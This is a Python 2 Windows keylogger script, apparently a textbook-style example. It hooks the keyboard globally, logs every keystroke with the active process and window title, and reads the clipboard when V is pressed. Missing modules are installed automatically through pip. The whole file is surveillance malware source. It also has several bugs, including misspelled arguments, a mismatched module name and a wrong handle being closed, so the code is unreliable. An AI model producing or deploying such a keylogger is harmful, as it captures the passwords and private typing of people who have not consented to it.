import subprocess as sub
try:
    from ctypes import *
    import pythoncom
    import pyhook
    import win32clipboard
except Exception, e:
    for i in ['pythoncom', 'pyhook', 'win32clipboard']:
        if i in e:
            try:
                p = sub.Popen(['pip install pythoncom'], stdout=sub.PIPE,stdrr=sub.PIPE)
                o,error = p.communicate()
                print o
            except:
                print error, e

user32          = windll.user32
kernel32        = windll.kernel32
psapi           = windll.psapi
current_window  = None

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = '%d' % pid.value
    executable = create_string_buffer('\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title = create_string_buffer('\0x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    print ''
    print '[ PID:%s - %s - %s]' % (process_id, executable.value, window_title.value)
    print ''

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if 32 < event.Ascii < 117:
        print chr(event.Ascii)
    else:
        if event.Key == 'V':
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        else:
            print '[%s]' % event.Key
    return True

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()
    
